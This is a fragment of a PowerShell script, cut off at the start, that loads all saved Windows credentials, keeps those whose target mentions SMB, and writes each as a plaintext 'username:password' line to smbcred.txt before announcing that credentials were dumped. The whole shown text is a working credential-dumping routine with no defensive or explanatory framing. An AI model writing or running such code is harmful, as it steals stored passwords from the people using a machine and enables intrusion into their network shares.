...
"@
    ...
    $credentials = [Credential]::LoadAll()

    foreach ($credential in $credentials) {
        $outputPath = Get-OutputPath $credential.Target

        # Filter credentials based on the target
        if ($credential.Target -match "smb") {
            # Format username and password as "username:password"
            $credentialInfo = "$($credential.Username):$($credential.Password)"

            # Read existing content, concatenate with new credentials, and write back to the file
            $existingContent = Get-Content -Path $outputPath -Raw -ErrorAction SilentlyContinue
            $updatedContent = $credentialInfo + "`r`n" + $existingContent

            # Write the updated content back to the file
            $updatedContent | Set-Content -Path $outputPath
        }
    }

    Write-Host "Credentials dumped to respective files"
}

function Get-OutputPath($target) {
    switch -wildcard ($target) {
        "*smb*" { return "smbcred.txt" }
        default { return ".txt" }
    }
}
